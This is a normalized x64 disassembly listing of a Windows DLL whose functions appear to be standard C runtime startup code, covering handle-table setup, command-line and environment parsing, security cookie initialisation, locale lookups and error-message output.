add r8 r15
call r8
lea rcx [ r--data ]
call sub_180026c30
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx rbp
call [ r--data ]
sub_18001fb80
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_18001fbec
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_18001d780
mov rcx rbx
call sub_18001d8bc
mov rcx rbx
call sub_180020e1c
mov rcx rbx
call sub_180026c74
mov rcx rbx
call sub_180024dd4
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_180021270
sub_18001fc30
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_18001fc64
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_18001fca0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ r--data ] 0x0
mov ebx ecx
je r-xdata
call sub_180024c44
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18001fc64
test eax eax
jne r-xdata
lea rcx [ r--data ]
call sub_180026c30
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_180020790 ]
call sub_18001a3a8
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ r--data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_180026c30
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_18001fd50
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_180022e38
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x1
mov ecx 0x8
call sub_180022d38
mov ecx r15d
call sub_18001fb80
mov ecx r15d
call [ ExitProcess@IAT ]
mov ecx 0x8
call sub_180022d38
test r12d r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18001fc30
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18001fc30
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
cmp rdi rsi
jb r-xdata
jmp r-xdata
mov rcx [ rdi ]
call [ DecodePointer@IAT ]
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
cmp r14 rbx
jne r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
jmp r-xdata
cmp r13 rax
je r-xdata
sub_18001ff24
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoW@IAT ]
mov edx 0x58
lea ebp [ rdx - 0x38 ]
mov ecx ebp
call sub_18001b79c
xor r14d r14d
mov rdx rax
test rax rax
jne r-xdata
mov [ rw-data ] rax
add rax 0xb00
mov ecx ebp
mov [ rw-data ] ecx
cmp rdx rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r14w
je r-xdata
add rdx 0x9
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov r12d r14d
mov rbx r14
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x2f ] 0xa00
mov [ rdx + 0x31 ] 0xa
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rw-data ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov ecx [ rw-data ]
lea eax [ r12 - 0x1 ]
mov [ rbx + rdi + 0x8 ] 0x81
neg eax
mov eax 0xfffffff6
sbb ecx ecx
add ecx 0xfffffff5
test r12d r12d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx + rdi ] 0xfffffffffffffffe
je r-xdata
movsxd r12 [ rax ]
mov ebx 0x800
lea r13 [ rax + 0x4 ]
add r12 r13
cmp [ rax ] ebx
cmovl ebx [ rax ]
cmp ecx ebx
jge r-xdata
or [ rbx + rdi + 0x8 ] 0x40
mov [ rbx + rdi ] 0xfffffffffffffffe
test rax rax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x80
jmp r-xdata
mov edi r14d
test ebx ebx
jle r-xdata
lea rdi [ rw-data ]
mov rdi [ rw-data ]
cmp [ rbx + rdi ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
add rbx 0x58
inc r12d
cmp rbx 0x108
jl r-xdata
cmp [ r12 ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
mov edx [ rw-data ]
lea rcx [ rax + 0xb00 ]
mov [ rdi ] rax
add edx ebp
mov [ rw-data ] edx
cmp rax rcx
jae r-xdata
movzx eax al
mov [ rbx + rdi ] rbp
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add r12 0x8
cmp edi ebx
jl r-xdata
cmp [ r12 ] 0xfffffffffffffffe
je r-xdata
add rdi 0x8
cmp edx ebx
jl r-xdata
lea rdx [ rax + 0x9 ]
cmp eax 0x3
jne r-xdata
or [ rbx + rdi + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx rbp
call sub_18001b79c
test rax rax
je r-xdata
jmp r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
and [ rdx + 0x2f ] 0x80
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x30 ] 0xa0a
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rdi ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov edx [ rw-data ]
lea rcx [ rbx + rdi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
inc [ rbx + rdi + 0xc ]
jmp r-xdata
movsxd rbp edi
lea rcx [ rw-data ]
mov edx 0xfa0
mov rax rbp
and ebp 0x1f
sar rax 0x5
imul rbp rbp 0x58
add rbp [ rcx + rax * 8 ]
mov rax [ r12 ]
mov [ rbp ] rax
mov al [ r13 ]
lea rcx [ rbp + 0x10 ]
mov [ rbp + 0x8 ] al
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
mov rcx [ r12 ]
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ rbp + 0xc ]
sub_1800201f8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov esi 0x40
add rbx 0x8
dec rsi
jne r-xdata
lea rax [ rdi + 0xb00 ]
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp rdi rax
jb r-xdata
cmp [ rdi + 0xc ] 0x0
je r-xdata
mov rcx [ rbx ]
call sub_180018b3c
and [ rbx ] 0x0
mov rax [ rbx ]
add rdi 0x58
add rax 0xb00
lea rcx [ rdi + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_18002026c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rbx [ rw-data ]
xor edi edi
test rbx rbx
jne r-xdata
call sub_18001ed5c
mov al [ rbx ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_18001b79c
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_180019aa0
lea rbx [ rbx + rax + 0x1 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_180018b3c
and [ rw-data ] 0x0
and [ rdi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_180019aa0
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
add rbx rax
cmp [ rbx ] 0x0
jne r-xdata
movsxd rbp esi
mov edx 0x1
mov rcx rbp
call sub_18001b79c
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_180018b3c
and [ rw-data ] 0x0
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_18001d5ec
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
add rdi 0x8
sub_18002039c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 [ rsp + 0x60 ]
mov r14 r9
mov rdi r8
and [ r13 ] 0x0
mov r12 rdx
mov rbx rcx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
xor ebp ebp
mov [ rdx ] r8
add r12 0x8
inc [ r13 ]
test rdi rdi
je r-xdata
xor eax eax
test ebp ebp
mov sil 0x22
sete al
inc rbx
mov ebp eax
jmp r-xdata
movzx esi [ rbx ]
inc rbx
mov ecx esi
call sub_180026cf8
test eax eax
je r-xdata
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test ebp ebp
jne r-xdata
test sil sil
je r-xdata
inc [ r13 ]
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
dec rbx
inc rbx
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r12 r12
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
xor esi esi
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
inc [ r14 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
and [ r12 ] 0x0
inc rbx
jmp r-xdata
cmp [ rbx ] 0x9
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r12 r12
je r-xdata
inc [ r14 ]
mov [ r12 ] rdi
add r12 0x8
cmp [ rbx ] 0x5c
je r-xdata
inc rbx
inc ecx
cmp [ rbx ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test dl cl
jne r-xdata
dec ecx
test rdi rdi
je r-xdata
mov al [ rbx ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ r13 ]
mov [ rdi ] 0x5c
inc rdi
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
lea rax [ rbx + 0x1 ]
cmp [ rax ] 0x22
jne r-xdata
inc [ r13 ]
jmp r-xdata
mov [ rdi ] 0x0
inc rdi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
inc rbx
jmp r-xdata
movsx ecx al
call sub_180026cf8
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
mov edx 0x1
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ r13 ]
inc rbx
inc [ r13 ]
mov al [ rbx ]
mov [ rdi ] al
inc rdi
jmp r-xdata
mov al [ rbx ]
inc rbx
mov [ rdi ] al
inc rdi
inc [ r13 ]
sub_18002056c
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_18001ed5c
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
or eax 0xffffffff
movsxd rcx [ rsp + 0x48 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18002039c
movsxd rsi [ rsp + 0x40 ]
mov rcx 0x1fffffffffffffff
cmp rsi rcx
jae r-xdata
lea rdx [ rcx + rsi * 8 ]
cmp rdx rcx
jb r-xdata
mov rcx rdx
call sub_18001b71c
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18002039c
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_180020664
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
call [ GetEnvironmentStringsW@IAT ]
xor r12d r12d
mov rdi rax
test rax rax
je r-xdata
xor eax eax
mov rbx rax
cmp [ rax ] r12w
je r-xdata
mov [ rsp + 0x38 ] r12
sub rbx rax
mov [ rsp + 0x30 ] r12
sar rbx 0x1
mov r8 rax
xor edx edx
lea r9d [ rbx + 0x1 ]
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
test eax eax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rcx rbp
call sub_18001b71c
mov rsi rax
test rax rax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rbx + 0x1 ]
mov r8 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
jmp r-xdata
mov rcx rsi
call sub_180018b3c
mov rsi r12
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_180020758
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_180020790
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_1800207c8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_18001e29c
xor r9d r9d
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rdx [ rax + 0xa0 ]
mov rcx rdx
lea rax [ rdx + 0xc0 ]
cmp rcx rax
jae r-xdata
lea rax [ rdx + 0xc0 ]
add rcx 0x10
cmp rcx rax
jb r-xdata
mov rcx r9
cmp [ rcx ] edi
je r-xdata
cmp [ rcx ] edi
je r-xdata
mov r8 [ rcx + 0x8 ]
test r8 r8
je r-xdata
test rcx rcx
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rcx + 0x8 ] r9
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
cmp [ rcx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r9
mov ecx [ rcx + 0x4 ]
call r8
mov edx 0x30
mov rax [ rbx + 0xa0 ]
add rdx 0x10
mov [ rdx + rax - 0x8 ] r9
cmp rdx 0xc0
jl r-xdata
cmp [ rcx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
cmp [ rcx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
cmp [ rcx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rcx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rcx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rcx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rcx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
cmp [ rcx ] 0xc00002b5
jne r-xdata
mov [ rbx + 0xb0 ] 0x8a
jmp r-xdata
cmp [ rcx ] 0xc00002b4
mov eax edi
mov edx 0x8e
cmove eax edx
mov [ rbx + 0xb0 ] eax
mov [ rbx + 0xb0 ] 0x8d
jmp r-xdata
sub_1800209ac
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180020a60
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov esi [ rbp + 0x68 ]
xor edi edi
mov r13d r9d
mov r14 r8
mov r15d edx
test esi esi
jne r-xdata
neg [ rbp + 0x70 ]
mov ecx esi
mov [ rsp + 0x28 ] edi
sbb edx edx
mov [ rsp + 0x20 ] rdi
and edx 0x8
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov esi [ rax + 0x4 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_180018450
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r8 r12
xor edx edx
mov rcx rbx
add r8 r8
call sub_18001d7d0
mov r9d r13d
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rbx
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov edi eax
call sub_18001b358
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_180018b3c
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180023d20
sub rsp rax
lea rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_180020bc0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_180018cdc
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0x98 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] r11d
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_180020a60
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180020c40
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0xd0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov rbx [ rsp + 0x130 ]
mov esi r9d
mov r12d r8d
mov r14 rcx
cmp edx 0x1
jne r-xdata
mov ebp 0x2
cmp edx ebp
jne r-xdata
lea r9 [ rsp + 0x40 ]
mov r8d esi
mov edx r12d
lea rdi [ rsp + 0x40 ]
xor ebp ebp
mov [ rsp + 0x20 ] 0x80
call sub_180026e64
mov r13d eax
test eax eax
jne r-xdata
test edx edx
jne r-xdata
and [ rbx ] 0x0
xor r9d r9d
xor r8d r8d
mov edx esi
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
movsxd rdi eax
test eax eax
je r-xdata
movsxd rsi r13d
mov edx 0x1
mov rcx rsi
call sub_18001b79c
mov rcx rax
mov [ rbx ] rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ rsp + 0x30 ] edx
bts esi 0x1d
lea r8 [ rsp + 0x30 ]
mov edx esi
mov r9d ebp
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov rcx [ rbx ]
call sub_180018b3c
and [ rbx ] 0x0
jmp r-xdata
mov rcx rdi
mov edx ebp
call sub_18001b79c
mov [ rbx ] rax
test rax rax
je r-xdata
lea eax [ r13 - 0x1 ]
mov r8 rdi
mov rdx rsi
movsxd r9 eax
call sub_1800212a0
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
and [ rsp + 0x20 ] ebp
xor r9d r9d
mov r8d esi
mov edx r12d
mov rcx r14
call sub_180026e64
movsxd r13 eax
test eax eax
je r-xdata
mov al [ rsp + 0x30 ]
mov [ rbx ] al
jmp r-xdata
mov r9d edi
mov r8 rax
mov edx esi
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
test ebp ebp
je r-xdata
mov rcx rdi
call sub_180018b3c
lea edx [ rbp + 0x1 ]
mov rcx r13
call sub_18001b79c
mov rdi rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
mov rcx rdi
call sub_180018b3c
mov r9 rax
mov r8d esi
mov edx r12d
mov rcx r14
mov ebp 0x1
mov [ rsp + 0x20 ] r13d
call sub_180026e64
mov r13d eax
test eax eax
je r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_180018450
add rsp 0xd0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180020e24
lea r8 [ r--data ]
xor eax eax
mov rdx r8
cdqe
add rax rax
mov rax [ r8 + rax * 8 + 0x8 ]
retn
inc eax
add rdx 0x10
cmp eax 0x16
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
xor eax eax
retn
sub_180020e50
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x250
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x240 ] rax
mov edi ecx
call sub_180020e24
xor esi esi
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x240 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x250 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
lea ecx [ rsi + 0x3 ]
call sub_1800271e4
cmp eax 0x1
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea ecx [ rsi + 0x3 ]
call sub_1800271e4
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov edx esi
lea r8 [ rsp + 0x40 ]
lea rbp [ rw-data ]
mov r12d 0x314
lea r8 [ r--data ]
mov rcx rbp
mov edx r12d
call sub_180027178
xor ecx ecx
test eax eax
jne r-xdata
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x233 ] sil
call sub_180019aa0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov rcx rdi
mov r8 rax
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
inc edx
inc r8
add rbx 0x2
cmp edx 0x1f4
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
